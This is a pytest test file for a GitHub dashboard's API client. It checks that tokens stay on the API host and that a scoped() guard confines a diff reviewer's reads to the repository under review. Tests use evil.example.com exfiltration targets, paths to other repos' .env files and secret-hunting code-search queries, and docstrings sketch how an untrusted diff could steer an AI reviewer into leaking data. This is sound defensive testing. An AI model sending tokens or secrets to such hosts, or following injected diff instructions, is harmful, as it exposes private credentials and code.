import json
import time

import pytest

from dashy.core import github

from conftest import PR, Result, fake_http, gql_nodes


def node(url, **fields):
	return dict(PR, url=url, **fields)


def api(handler):
	"""fake_http, with `{viewer{login}}` answered for free — every list call needs the login first."""
	def go(url, body):
		if body and body.get("query", "").startswith("{ viewer"):
			return {"data": {"viewer": {"login": "me"}}}
		return handler(url, body)
	return fake_http(go)


def test_token_comes_from_the_environment_alone(monkeypatch):
	assert github.token() == ""  # no token is not a crash: public repos still answer
	monkeypatch.setenv("GITHUB_TOKEN", "gho_b")
	monkeypatch.setenv("GH_TOKEN", " gho_a\n")
	assert github.token() == "gho_a"  # GH_TOKEN wins, and the newline a `cat`-ed secret carries is gone


def test_call_sends_the_token_and_the_json_body(monkeypatch):
	monkeypatch.setenv("GH_TOKEN", "gho_x")
	seen = []
	monkeypatch.setattr(github.urllib.request, "urlopen",
	                    fake_http(lambda url, body: seen.append((url, body)) or "{}"))
	github.call("/repos/a/b/issues/7/comments", "POST", {"body": "hi"})
	assert seen == [("https://api.github.com/repos/a/b/issues/7/comments", {"body": "hi"})]
	req, headers = github.urllib.request.Request, []  # the header carries the auth; assert it, not just the url
	monkeypatch.setattr(github.urllib.request, "Request", lambda *a, **kw: headers.append(kw["headers"]) or req(*a, **kw))
	github.call("/user")
	assert headers[-1]["Authorization"] == "Bearer gho_x"


def test_the_token_never_leaves_the_api_host(monkeypatch):
	"""A review reads untrusted diffs and picks the path it asks for; an absolute URL must not carry the
	token off-host. github.call takes one because GRAPHQL is absolute, so the header is what is guarded."""
	monkeypatch.setenv("GH_TOKEN", "gho_x")
	headers, req = [], github.urllib.request.Request
	monkeypatch.setattr(github.urllib.request, "Request", lambda *a, **kw: headers.append(kw["headers"]) or req(*a, **kw))
	monkeypatch.setattr(github.urllib.request, "urlopen", fake_http(lambda url, body: "{}"))
	github.call("https://evil.example.com/collect")
	assert "Authorization" not in headers[-1]
	github.call(github.GRAPHQL, "POST", {"query": "{a}"})  # the API's own absolute url still gets it
	assert headers[-1]["Authorization"] == "Bearer gho_x"


def test_the_token_is_dropped_when_a_redirect_leaves_the_host():
	"""urllib copies every header onto a redirect, so the check in call() guards only the first request."""
	h = github._StripAuthOnRedirect()
	req = github.urllib.request.Request("https://api.github.com/x", headers={"Authorization": "Bearer gho_x"})
	same = h.redirect_request(req, None, 302, "", {}, "https://api.github.com/y")
	off = h.redirect_request(req, None, 302, "", {}, "https://evil.example.com/y")
	assert same.get_header("Authorization") == "Bearer gho_x"
	assert not any(k.lower() == "authorization" for k in off.headers)


def test_call_turns_an_http_error_into_an_oserror_with_githubs_message(monkeypatch):
	import io
	import urllib.error
	def boom(req, timeout=None):
		raise urllib.error.HTTPError(req.full_url, 404, "Not Found", {}, io.BytesIO(b'{"message": "Not Found"}'))
	monkeypatch.setattr(github.urllib.request, "urlopen", boom)
	with pytest.raises(OSError) as e:  # ponytail: an OSError, so review.py's existing except still catches it
		github.call("/repos/a/b/pulls/9")
	assert "404" in str(e.value) and "Not Found" in str(e.value)


def test_a_401_without_a_token_says_how_to_get_one(monkeypatch):
	import io
	import urllib.error
	monkeypatch.setattr(github.urllib.request, "urlopen", lambda req, timeout=None: (_ for _ in ()).throw(
		urllib.error.HTTPError(req.full_url, 401, "Unauthorized", {}, io.BytesIO(b"{}"))))
	with pytest.raises(github.Error) as e:
		github.call("/user")
	assert "GH_TOKEN" in str(e.value)  # a 401 with no token says which one to set


def test_gql_keeps_partial_data_and_raises_when_there_is_none(monkeypatch):
	monkeypatch.setattr(github.urllib.request, "urlopen", fake_http(
		lambda url, body: {"data": {"a": 1}, "errors": [{"message": "missing read:org"}]}))
	assert github.gql("{a}") == {"a": 1}  # a scope the token lacks drops fields, it must not lose the rest
	monkeypatch.setattr(github.urllib.request, "urlopen", fake_http(
		lambda url, body: {"data": None, "errors": [{"message": "Bad credentials"}]}))
	with pytest.raises(github.Error, match="Bad credentials"):
		github.gql("{a}")


def test_fetch_dedups_sorts_and_appends_reviewed(monkeypatch):
	a = node("a", updatedAt="2020-01-01T00:00:00Z", reviewDecision="CHANGES_REQUESTED",
	         reviewRequests={"totalCount": 1})
	b = node("b", updatedAt="2021-01-01T00:00:00Z", reviewDecision="APPROVED")
	monkeypatch.setattr(github.urllib.request, "urlopen", api(lambda url, body: gql_nodes([a, b], [a], [])))
	secs = github.fetch()
	assert [n for n, _, _ in secs] == ["MINE", "REVIEW REQUESTED", "ASSIGNED", "REVIEWED"]
	assert [p["url"] for p in secs[0][1]] == ["b", "a"]  # newest first
	assert [p["status"] for p in secs[0][1]] == ["✓ approved", "↻ re-review requested"]  # own PRs carry github's review decision
	assert secs[0][1][0]["repository"]["nameWithOwner"] == "a/b" and secs[0][1][0]["number"] == 7
	assert github.own_status({"reviewDecision": "CHANGES_REQUESTED", "reviewRequests": {"totalCount": 0}}) == "✗ changes requested"
	assert github.own_status({"reviewDecision": "REVIEW_REQUIRED", "reviewRequests": {"totalCount": 2}}) == "· awaiting review"
	assert github.own_status({}) == ""
	assert secs[1][1] == []  # a already shown under MINE
	assert secs[3] == ("REVIEWED", [], None)


def test_fetch_asks_for_the_three_sections_under_my_own_login(monkeypatch):
	"""`@me` is gh sugar the API does not resolve — the query must carry the login."""
	sent = []
	monkeypatch.setattr(github.urllib.request, "urlopen",
	                    api(lambda url, body: sent.append(body["query"]) or gql_nodes([], [], [])))
	github.fetch()
	assert "@me" not in sent[0]
	for i, q in enumerate(("author:me", "review-requested:me", "assignee:me")):
		assert f's{i}: search(query: "is:pr is:open {q}"' in sent[0]


def test_fetch_reports_the_error_on_every_section(monkeypatch):
	monkeypatch.setattr(github.urllib.request, "urlopen",
	                    api(lambda url, body: {"data": None, "errors": [{"message": "Bad credentials"}]}))
	secs = github.fetch()
	assert [n for n, _, _ in secs] == ["MINE", "REVIEW REQUESTED", "ASSIGNED", "REVIEWED"]
	assert all(ps is None and "Bad credentials" in err for _, ps, err in secs[:3])
	assert secs[3] == ("REVIEWED", [], None)  # the local log still renders with github down


def test_fetch_handles_bad_json(monkeypatch):
	monkeypatch.setattr(github.urllib.request, "urlopen", api(lambda url, body: "not json"))
	name, ps, err = github.fetch()[0]
	assert ps is None and err


def test_fetch_joins_ci_and_head_onto_every_section(monkeypatch):
	a = node("a", headRefOid="aaa", reviewDecision="APPROVED",
	         commits={"nodes": [{"commit": {"statusCheckRollup": {"state": "FAILURE"}}}]})
	b = node("b", headRefOid="bbb", commits={"nodes": [{"commit": {"statusCheckRollup": None}}]},
	         latestReviews={"nodes": [{"author": {"login": "erin"}, "state": "COMMENTED"}]})
	monkeypatch.setattr(github.urllib.request, "urlopen", api(lambda url, body: gql_nodes([a], [b], [])))
	secs = github.fetch()
	a, b = secs[0][1][0], secs[1][1][0]
	assert (a["head"], a["checks"], a["status"]) == ("aaa", "✗", "✓ approved")
	assert (b["head"], b["checks"]) == ("bbb", "") and "status" not in b  # no checks configured, not my PR
	assert b["reviewers"] == "~erin"  # reviewers on EVERY section, not just MINE
	assert github.checks({"commits": {"nodes": [{"commit": {"statusCheckRollup": {"state": "PENDING"}}}]}}) == "●"


def test_a_pr_with_no_head_in_the_result_gets_none(monkeypatch):
	"""A missing field must read like a failed call — no head at all, not "" masquerading as one."""
	monkeypatch.setattr(github.urllib.request, "urlopen", api(lambda url, body: gql_nodes([], [node("b")], [])))
	b = github.fetch()[1][1][0]
	assert "head" not in b and b["checks"] == ""


def test_open_in_browser_uses_open_on_mac(monkeypatch):
	ran = []
	monkeypatch.setattr(github.subprocess, "Popen", lambda cmd, **kw: ran.append(cmd))
	monkeypatch.setattr(github.sys, "platform", "darwin")
	github.open_in_browser("u")
	monkeypatch.setattr(github.sys, "platform", "linux")
	github.open_in_browser("u")
	assert [c[0] for c in ran] == ["open", "xdg-open"]


# ---- review ----


def test_copy_uses_first_clipboard_tool_on_path(monkeypatch):
	ran = []
	monkeypatch.setattr(github.shutil, "which", lambda c: c == "xclip")
	rc = [0]
	monkeypatch.setattr(github.subprocess, "run", lambda cmd, **kw: ran.append((cmd, kw["input"])) or Result(returncode=rc[0]))
	assert github.copy("https://x/pr/1") == "xclip"
	assert ran == [(["xclip", "-selection", "clipboard"], "https://x/pr/1")]
	monkeypatch.setattr(github.sys, "__stdout__", __import__("io").StringIO())
	rc[0] = 1  # xclip on PATH but no DISPLAY: it fails, the escape must still go out
	assert github.copy("u") == "terminal" and len(ran) == 2
	assert github.sys.__stdout__.getvalue() == "\033]52;c;dQ==\a"
	monkeypatch.setattr(github.shutil, "which", lambda c: None)
	assert github.copy("u") == "terminal" and len(ran) == 2


def test_reviewers_merges_requests_over_latest_reviews():
	node = {"latestReviews": {"nodes": [{"author": {"login": "bob"}, "state": "APPROVED"},
	                                    {"author": {"login": "carol"}, "state": "CHANGES_REQUESTED"}, None]},
	        "reviewRequests": {"nodes": [{"requestedReviewer": {"login": "alice"}},
	                                     {"requestedReviewer": {"login": "carol"}},  # re-requested after her ✗
	                                     {"requestedReviewer": {}}, {"requestedReviewer": None}]}}  # a Team: not asked for
	assert github.reviewers(node) == "✓bob ·carol ·alice"
	assert github.reviewers({}) == ""


def test_a_comment_survives_its_still_standing_review_request():
	"""A COMMENTED review does not clear the request, so the request must not erase the comment."""
	node = {"latestReviews": {"nodes": [{"author": {"login": "bob"}, "state": "COMMENTED"}]},
	        "reviewRequests": {"nodes": [{"requestedReviewer": {"login": "bob"}}]}}
	assert github.reviewers(node) == "~bob"


def test_a_dismissed_review_reads_as_not_yet_looked_not_as_a_comment():
	"""Dismissing a review re-requests the reviewer; DISMISSED has no glyph and must not fall back to ~."""
	node = {"latestReviews": {"nodes": [{"author": {"login": "bob"}, "state": "DISMISSED"}]},
	        "reviewRequests": {"nodes": [{"requestedReviewer": {"login": "bob"}}]}}
	assert github.reviewers(node) == "·bob"


def test_persist_auth_writes_the_token_into_the_checkout_not_argv(tmp_path, monkeypatch):
	"""The clone's GIT_CONFIG_* env dies with the process; the refresh tick still has to authenticate."""
	monkeypatch.setenv("GH_TOKEN", "gho_x")
	cfg = tmp_path / ".git" / "config"
	cfg.parent.mkdir()
	cfg.write_text("[core]\n")
	github.persist_auth(str(tmp_path))
	assert '[http "https://github.com/"]\n\textraHeader = Authorization: Basic eC1hY2Nlc3MtdG9rZW46Z2hvX3g=' in cfg.read_text()
	assert oct(cfg.stat().st_mode)[-3:] == "600"  # a token on disk is never world-readable
	github.persist_auth(str(tmp_path / "nope"))   # a failed clone left no config: nothing to write


def test_no_token_means_no_header_anywhere(tmp_path, monkeypatch):
	"""Both callers early-out on git_header() == "": nothing in the env, nothing written to disk."""
	monkeypatch.delenv("GH_TOKEN", raising=False)
	monkeypatch.delenv("GITHUB_TOKEN", raising=False)
	cfg = tmp_path / ".git" / "config"
	cfg.parent.mkdir()
	cfg.write_text("[core]\n")
	assert github.git_header() == "" and github.git_auth() == {}
	github.persist_auth(str(tmp_path))
	assert cfg.read_text() == "[core]\n"


def test_collaborators_and_request_review(monkeypatch):
	import io
	import urllib.error
	seen = []
	def http(url, body):
		seen.append((url, body))
		if url.endswith("requested_reviewers"):
			raise urllib.error.HTTPError(url, 422, "Unprocessable", {}, io.BytesIO(b'{"message": "Reviews may only be requested from collaborators"}'))
		return [{"login": "alice"}, {"login": "bob"}]
	monkeypatch.setattr(github.urllib.request, "urlopen", fake_http(http))
	assert github.collaborators("a/b") == ["alice", "bob"]
	assert seen[0][0] == "https://api.github.com/repos/a/b/collaborators?per_page=100"
	assert "only be requested from collaborators" in github.request_review("a/b", 7, "alice")
	assert seen[1] == ("https://api.github.com/repos/a/b/pulls/7/requested_reviewers", {"reviewers": ["alice"]})


def test_collaborators_is_empty_when_it_cannot_list_them(monkeypatch):
	def boom(req, timeout=None):
		raise OSError("offline")
	monkeypatch.setattr(github.urllib.request, "urlopen", boom)
	assert github.collaborators("a/b") == []  # no admin rights, or no network: the picker takes a typed login


def test_post_review_and_comment_send_the_right_bodies(monkeypatch):
	seen = []
	monkeypatch.setattr(github.urllib.request, "urlopen", fake_http(lambda url, body: seen.append((url, body)) or "{}"))
	github.post_review("a/b", 7, "request_changes", "nope")
	github.comment("a/b", 7, "on my way")
	assert seen == [("https://api.github.com/repos/a/b/pulls/7/reviews", {"event": "REQUEST_CHANGES", "body": "nope"}),
	                ("https://api.github.com/repos/a/b/issues/7/comments", {"body": "on my way"})]


def test_detail_normalises_checks_and_never_raises(monkeypatch):
	pr = {"headRefName": "feat/kb", "additions": 412, "deletions": 96, "changedFiles": 14,
	      "commits": {"nodes": [{"commit": {"statusCheckRollup": {"contexts": {"nodes": [
	          {"name": "ci", "conclusion": "SUCCESS"}, {"name": "lint", "conclusion": "FAILURE"},
	          {"context": "e2e", "state": "PENDING"}, {"name": "odd", "conclusion": "WHAT"},
	          {"conclusion": "SUCCESS"}]}}}}]}}
	sent = []
	monkeypatch.setattr(github.urllib.request, "urlopen", fake_http(
		lambda url, body: sent.append(body["query"]) or {"data": {"repository": {"pullRequest": pr}}}))
	d = github.detail("a/b", 7)
	assert 'repository(owner: "a", name: "b")' in sent[0] and "pullRequest(number: 7)" in sent[0]
	assert d["branch"] == "feat/kb" and (d["add"], d["del"], d["files"]) == (412, 96, 14)
	assert d["checks"] == [{"name": "ci", "state": "ok"}, {"name": "lint", "state": "fail"},
	                       {"name": "e2e", "state": "run"}, {"name": "odd", "state": "run"}]
	def boom(req, timeout=None):
		raise OSError("timed out")
	monkeypatch.setattr(github.urllib.request, "urlopen", boom)
	assert github.detail("a/b", 7) == {}  # a pane is decoration; the row is still right


def test_want_detail_fetches_once_off_the_draw_thread(monkeypatch):
	from dashy.core.state import State
	calls = []
	monkeypatch.setattr(github, "detail", lambda repo, n: calls.append((repo, n)) or {"branch": "b"})
	st = State(60)
	assert st.want_detail(None) is None
	# first ask starts a fetch and returns nothing yet
	assert st.want_detail(dict(PR)) is None
	for _ in range(200):
		if dict(PR)["url"] in st.details:
			break
		time.sleep(0.005)
	assert st.want_detail(dict(PR)) == {"branch": "b"}
	st.want_detail(dict(PR))
	assert len(calls) == 1  # cached, not refetched on every draw


def test_context_carries_the_pr_and_its_diff(monkeypatch):
	pr = {"title": "T", "body": "why", "additions": 1, "deletions": 2, "changed_files": 3,
	      "user": {"login": "kim"}, "base": {"ref": "main"}, "head": {"ref": "feat"}, "labels": [{"name": "bug"}]}
	monkeypatch.setattr(github.urllib.request, "urlopen",
	                    fake_http(lambda url, body: "diff --git a b" if "diff" in url else pr))
	# ponytail: the diff comes from the same path with a different Accept, so the fake keys off the header
	monkeypatch.setattr(github, "call", lambda path, **kw: "diff --git a b"
	                    if kw.get("accept", "").endswith("diff") else json.dumps(pr))
	text = github.context("a/b", 7)
	assert "title: T" in text and "author: kim" in text and "baseRefName: main" in text
	assert 'labels: ["bug"]' in text and text.endswith("diff --git a b")


def test_context_truncates_a_huge_diff(monkeypatch):
	monkeypatch.setattr(github, "PR_CONTEXT_MAX", 100)
	monkeypatch.setattr(github, "call", lambda path, **kw: "x" * 1000
	                    if kw.get("accept", "").endswith("diff") else json.dumps({"title": "t"}))
	text = github.context("a/b", 7)
	assert text.endswith("[diff truncated]") and len(text) < 200


@pytest.mark.parametrize("path, want", [
	("/repos/acme/api/pulls/7", "/repos/acme/api/pulls/7"),
	("repos/acme/api/pulls/7", "/repos/acme/api/pulls/7"),          # no leading slash
	("/repos/ACME/API/pulls/7", "/repos/ACME/API/pulls/7"),         # github is case-insensitive here
	("/repos/acme/api", "/repos/acme/api"),                         # the repo itself
	("/repos/acme/api/contents/x.py?ref=feat", "/repos/acme/api/contents/x.py?ref=feat"),
])
def test_scoped_lets_the_repo_under_review_through(path, want):
	assert github.scoped(path, "acme/api") == want


@pytest.mark.parametrize("path", [
	"/repos/some-other-org/private-repo/contents/.env",
	"/user/repos?per_page=100",
	"/repos/acme/api-secrets/contents/.env",   # ponytail: the separator. A bare startswith let a
	"/repos/acme/apifoo",                      # neighbouring repo through, which is the one to guess at
	"/orgs/acme/members",
	"/search/repositories?q=acme",             # only /search/code is rewritable; the rest are not
	"/gists",
])
def test_scoped_refuses_everything_outside_it(path):
	"""ponytail: the reviewer reads an untrusted diff and its body is posted on that diff's PR, so an
	unscoped read closes a loop — steer it, and the answer is published for you."""
	with pytest.raises(ValueError, match="acme/api"):
		github.scoped(path, "acme/api")


def test_scoped_forces_the_repo_into_a_code_search():
	"""ponytail: REWRITTEN, not merely checked. A q with no qualifier searches every repo the token can
	see, so refusing only the ones naming someone else leaves the default — what a model writes first."""
	import urllib.parse
	def q(path):
		return urllib.parse.parse_qs(github.scoped(path, "acme/api").partition("?")[2])["q"][0]
	assert q("/search/code?q=parseToken") == "parseToken repo:acme/api"
	assert q("/search/code?q=parseToken+repo:acme/api") == "parseToken repo:acme/api"  # not doubled
	assert q("/search/code/?q=x") == "x repo:acme/api"                                 # trailing slash
	for hostile in ("/search/code?q=AWS_SECRET+user:victim", "/search/code?q=x+repo:other/repo",
	                "/search/code?q=x+org:victim"):
		with pytest.raises(ValueError, match="acme/api"):
			github.scoped(hostile, "acme/api")


def test_an_unscoped_call_is_a_person_at_a_terminal():
	"""`gitdashy api /user/repos` typed by hand is not the threat, and refusing it teaches a workaround."""
	assert github.scoped("/user/repos", "") == "/user/repos"


def test_a_search_needs_something_to_search_for():
	"""ponytail: stripping the caller's repo: could leave the query empty, and a qualifier on its own is
	a 422 from GitHub — which reads as the scoping being broken rather than as a malformed question."""
	for empty in ("/search/code?q=", "/search/code", "/search/code?q=repo:acme/api"):
		with pytest.raises(ValueError, match="something to search for"):
			github.scoped(empty, "acme/api")


def test_owner_is_a_placing_qualifier_too():
	"""ponytail: no leak today — the forced repo: ANDs, so this returns nothing rather than someone
	else's code. It is one string in a list that exists for exactly this, and the next syntax GitHub
	adds is the one nobody re-derives the AND argument for."""
	with pytest.raises(ValueError, match="acme/api"):
		github.scoped("/search/code?q=x+owner:victim", "acme/api")


def a_binding(monkeypatch, tmp_path, rows):
	"""Write a bindings store. ponytail: the real file and the real reader — scoped() leans on bind's
	precedence rather than copying it, so a fake resolver here would test the copy that does not exist."""
	from dashy.core import bind
	p = tmp_path / "bindings"
	p.write_text("\n".join(json.dumps(r) for r in rows) + "\n")
	monkeypatch.setattr(bind, "BINDINGS", str(p))


def test_a_sibling_bound_to_the_same_team_is_readable(monkeypatch, tmp_path):
	a_binding(monkeypatch, tmp_path, [{"repo": "acme/api", "team": "acme/platform"},
	                                  {"repo": "acme/shared-lib", "team": "acme/platform"},
	                                  {"repo": "acme/payroll", "team": "acme/finance"}])
	assert github.scoped("/repos/acme/shared-lib/contents/x.py", "acme/api", "acme/platform") \
		== "/repos/acme/shared-lib/contents/x.py"
	for outside in ("/repos/acme/payroll/contents/.env",      # bound, but to another team
	                "/repos/acme/unbound/contents/x",         # bound to nothing
	                "/repos/other-org/x/contents/y"):
		with pytest.raises(ValueError, match="acme/platform"):
			github.scoped(outside, "acme/api", "acme/platform")


def test_without_a_team_a_sibling_is_still_refused(monkeypatch, tmp_path):
	"""An untrusted author gets the repo under review and nothing else, exactly as before."""
	a_binding(monkeypatch, tmp_path, [{"repo": "acme/shared-lib", "team": "acme/platform"}])
	with pytest.raises(ValueError, match="acme/api"):
		github.scoped("/repos/acme/shared-lib/contents/x.py", "acme/api", "")


def test_an_owner_rule_widens_it_and_a_tombstone_still_bites(monkeypatch, tmp_path):
	"""ponytail: THE reason scoped() resolves through bind.of instead of a list built here. An unbind is
	a tombstone that beats the owner rule, and a list of patterns assembled separately would have to
	re-implement that ordering — which is how the two would come to disagree about one repo."""
	a_binding(monkeypatch, tmp_path, [{"owner": "acme", "team": "acme/platform"},
	                                  {"forget": "acme/payroll"}])
	assert github.scoped("/repos/acme/anything/contents/x", "acme/api", "acme/platform")
	with pytest.raises(ValueError, match="acme/platform"):
		github.scoped("/repos/acme/payroll/contents/.env", "acme/api", "acme/platform")


def test_search_stays_on_the_repo_under_review_even_when_reads_are_wider(monkeypatch, tmp_path):
	"""ponytail: several repo: qualifiers would have to OR for a wider search to be safe, and leaning a
	boundary on GitHub's query semantics is what the refusal loop already declines to do."""
	a_binding(monkeypatch, tmp_path, [{"repo": "acme/shared-lib", "team": "acme/platform"}])
	got = github.scoped("/search/code?q=parseToken", "acme/api", "acme/platform")
	assert "repo%3Aacme%2Fapi" in got and "shared-lib" not in got


@pytest.mark.parametrize("path, want", [
	("/repos/acme/api/pulls/7", "acme/api"), ("repos/acme/api", "acme/api"),
	("/search/code", ""), ("/user/repos", ""), ("/repos/acme", ""), ("/repos", ""),
])
def test_repo_of_reads_the_addressed_repo(path, want):
	assert github.repo_of(path) == want
